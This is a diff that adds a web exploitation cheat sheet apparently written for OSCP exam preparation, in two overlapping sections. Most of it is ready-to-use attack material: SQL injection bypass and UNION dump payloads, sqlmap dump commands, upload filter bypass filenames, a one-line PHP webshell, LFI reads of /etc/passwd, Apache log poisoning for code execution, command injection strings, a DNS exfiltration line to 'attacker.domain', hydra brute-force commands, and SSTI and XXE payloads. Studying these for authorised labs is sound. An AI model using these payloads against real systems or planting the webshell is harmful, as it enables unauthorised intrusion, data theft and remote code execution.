@@ -1,0 +1,407 @@
+######################################################################
+# 02 — WEB ATTACKS & EXPLOITATION (OSCP-SAFE)
+######################################################################
+
+======================================================================
+# 1. MANUAL SQL INJECTION TESTING
+======================================================================
+
+###############################
+# Basic Boolean Bypass Payloads
+###############################
+' OR '1'='1 --
+" OR "1"="1 --
+admin' --
+admin' OR 1=1 --
+') OR ('1'='1
+" OR 1=1--
+
+
+###############################
+# Detect Number of Columns (ORDER BY)
+###############################
+?id=1 ORDER BY 1--
+?id=1 ORDER BY 2--
+?id=1 ORDER BY 3--
+?id=1 ORDER BY 4--
+
+
+###############################
+# UNION Injection — Column Count Discovery
+###############################
+?id=1 UNION SELECT NULL--
+?id=1 UNION SELECT NULL,NULL--
+?id=1 UNION SELECT NULL,NULL,NULL--
+
+# With integers
+?id=1 UNION SELECT 1,2,3--
+
+
+###############################
+# Extract DB Information
+###############################
+
+# MySQL
+?id=1 UNION SELECT @@version,2,3--
+?id=1 UNION SELECT user(),2,3--
+?id=1 UNION SELECT database(),2,3--
+
+# Tables
+?id=1 UNION SELECT table_name,2,3 \
+FROM information_schema.tables--
+
+# Columns of specific table
+?id=1 UNION SELECT column_name,2,3 \
+FROM information_schema.columns WHERE table_name='users'--
+
+# Dump users table
+?id=1 UNION SELECT username,password,3 FROM users--
+
+
+======================================================================
+# 2. SQLMAP (NOT ALLOWED IN OSCP EXAM — LAB USE ONLY)
+======================================================================
+
+sqlmap -u "http://$targetip/login.php?user=admin" --batch --dbs
+sqlmap -u "http://$targetip/vuln?id=1" --dump -D dbname -T users
+
+
+######################################################################
+# 3. FILE UPLOAD → RCE
+######################################################################
+
+###############################
+# Common Payload Filenames
+###############################
+shell.php
+shell.php.jpg
+shell.php%00.jpg
+shell.PHP
+shell.phtml
+shell.phar
+
+
+###############################
+# MIME-Type Bypass (Burp Request)
+###############################
+Content-Type: image/jpeg
+
+
+###############################
+# Basic PHP Webshell
+###############################
+<?php system($_GET['cmd']); ?>
+
+# Example call
+http://$targetip/uploads/shell.php?cmd=id
+
+
+###############################
+# Extension Bypass Tricks
+###############################
+.php.jpg
+.php.png
+.php;.jpg
+.pHp
+.phtml
+.phar
+
+
+######################################################################
+# 4. LOCAL FILE INCLUSION → RCE
+######################################################################
+
+###############################
+# Basic LFI Testing Payloads
+###############################
+?page=../../../../etc/passwd
+?page=../../../../etc/hosts
+?page=../../../../windows/win.ini
+
+
+###############################
+# PHP Filter Wrapper (Source Disclosure)
+###############################
+?page=php://filter/convert.base64-encode/resource=index.php
+
+
+###############################
+# Apache Log Poisoning → RCE
+###############################
+
+# Step 1: Send malicious header via Burp
+User-Agent: <?php system($_GET['cmd']); ?>
+
+# Step 2: Trigger execution
+http://$targetip/vuln?page=/var/log/apache2/access.log&cmd=id
+
+
+###############################
+# SSH Log Poisoning (if SSH enabled)
+###############################
+/var/log/auth.log
+
+
+######################################################################
+# 5. COMMAND INJECTION DISCOVERY
+######################################################################
+
+###############################
+# Identify Vulnerabilities
+###############################
+; id
+&& whoami
+| uname -a
+$(id)
+`hostname`
+
+# Example vulnerable endpoint
+http://$targetip/ping.php?host=8.8.8.8;id
+
+
+###############################
+# Blind Command Injection
+###############################
+
+# Time-based
+8.8.8.8; sleep 5
+
+# DNS exfil
+8.8.8.8; nslookup attacker.domain
+
+
+######################################################################
+# 6. HYDRA / BRUTE FORCING (OSCP SAFE IF NON-AGGRESSIVE)
+######################################################################
+
+###############################
+# SSH Brute Force
+###############################
+hydra -l admin -P rockyou.txt ssh://$targetip
+
+###############################
+# HTTP POST Form Brute Force
+###############################
+hydra -l admin -P passwords.txt $targetip http-post-form \
+"/login.php:user=^USER^&pass=^PASS^:F=invalid"
+
+###############################
+# FTP Brute Force
+###############################
+hydra -l admin -P rockyou.txt ftp://$targetip
+
+
+######################################################################
+# 7. WORDLIST GENERATION
+######################################################################
+
+###############################
+# Generate Custom Wordlist From Website
+###############################
+cewl http://$targetip -w words.txt
+
+###############################
+# Crunch Wordlist Maker
+###############################
+crunch 6 8 abc123 -o crunch.txt
+
+
+######################################################################
+# 8. OSCP WEB METHODOLOGY CHECKLIST
+######################################################################
+
+===========================
+STEP 1 — INFORMATION GATHERING
+===========================
+- whatweb
+- gobuster / feroxbuster
+- nikto
+- robots.txt
+- sitemaps
+
+===========================
+STEP 2 — CHECK COMMON WEB VULNS
+===========================
+- SQL Injection
+- LFI/RFI
+- Command injection
+- File upload → RCE
+- SSTI (if templates detected)
+- Auth bypass
+
+===========================
+STEP 3 — GET A SHELL
+===========================
+- Webshell upload
+- LFI log poisoning
+- Command injection
+
+===========================
+STEP 4 — STABILIZE SHELL
+===========================
+- upgrade TTY
+- add revshell if needed
+
+===========================
+STEP 5 — PRIVILEGE ESCALATION
+===========================
+- Linux privesc enum
+- Windows privesc enum
+
+===========================
+STEP 6 — DOCUMENT EVERYTHING
+===========================
+- commands used
+- screenshots for OSCP
+- proof.txt files
+
+
+######################################################################
+
+######################################################################
+# 03 – WEB EXPLOITATION (OSCP 2025)
+######################################################################
+
+===============================
+# 1. SQL INJECTION – Manual Tests
+===============================
+
+# Basic tests
+' OR '1'='1 --
+" OR "1"="1 --
+admin' --
+admin' OR 1=1 --
+') OR ('1'='1
+
+# Numeric
+1 OR 1=1--
+1 AND 1=2--
+
+===============================
+# 2. Identify Columns (ORDER BY)
+===============================
+?id=1 ORDER BY 1--
+?id=1 ORDER BY 2--
+?id=1 ORDER BY 3--
+?id=1 ORDER BY 4--
+
+===============================
+# 3. UNION Injection – Column Count
+===============================
+?id=1 UNION SELECT NULL--
+?id=1 UNION SELECT NULL,NULL--
+?id=1 UNION SELECT NULL,NULL,NULL--
+
+# Check visible column
+?id=1 UNION SELECT 1,2,3--
+
+===============================
+# 4. Dump Data via UNION
+===============================
+?id=1 UNION SELECT database(),2,3--
+?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--
+?id=1 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+?id=1 UNION SELECT username,password,3 FROM users--
+
+===============================
+# 5. SQLMap (Lab Only – Not Allowed In Exam)
+===============================
+sqlmap -u "http://$targetip/login.php?user=admin" --batch --dbs
+sqlmap -u "http://$targetip/vuln?id=1" --dump -D dbname -T users
+
+===============================
+# 6. File Upload → RCE
+===============================
+
+# Payload filenames
+shell.php
+shell.php.jpg
+shell.php%00.jpg
+shell.phtml
+shell.PHP
+
+# Bypass MIME type
+Content-Type: image/jpeg
+
+# PHP webshell
+<?php system($_GET['cmd']); ?>
+
+# Execute
+http://$targetip/uploads/shell.php?cmd=id
+
+===============================
+# 7. Local File Inclusion (LFI)
+===============================
+?page=../../../../etc/passwd
+?page=../../../../windows/win.ini
+
+# PHP filter
+?page=php://filter/convert.base64-encode/resource=index.php
+
+===============================
+# 8. LFI → RCE via Log Poisoning
+===============================
+# Inject webshell into User-Agent:
+User-Agent: <?php system($_GET['cmd']); ?>
+
+# Access it:
+http://$targetip/vuln?page=/var/log/apache2/access.log&cmd=id
+
+===============================
+# 9. Command Injection Tests
+===============================
+; id
+&& whoami
+| uname -a
+$(id)
+`whoami`
+
+http://$targetip/ping.php?host=8.8.8.8;id
+
+===============================
+# 10. SSTI Tests (Common)
+===============================
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+
+===============================
+# 11. XXE Basic Payload
+===============================
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+
+===============================
+# 12. Common Web Auth Bypass
+===============================
+admin' OR 1=1--
+admin" OR 1=1--
+' OR ''='
+
+===============================
+# 13. Common Backup Files To Check
+===============================
+index.php~
+index.php.bak
+index.old
+backup.zip
+website.tar.gz
+
+===============================
+# 14. Common Web CVEs (OSCP Frequently Used)
+===============================
+Apache Struts
+Apache 2.4.49 / 2.4.50 Path Traversal
+Tomcat Manager RCE
+PHP CGI Argument Injection
+Exposed .git folder
+Drupalgeddon
+WordPress plugin exploits
+
+######################################################################
+# END OF 03_WEB_EXPLOITATION.TXT
+######################################################################
+
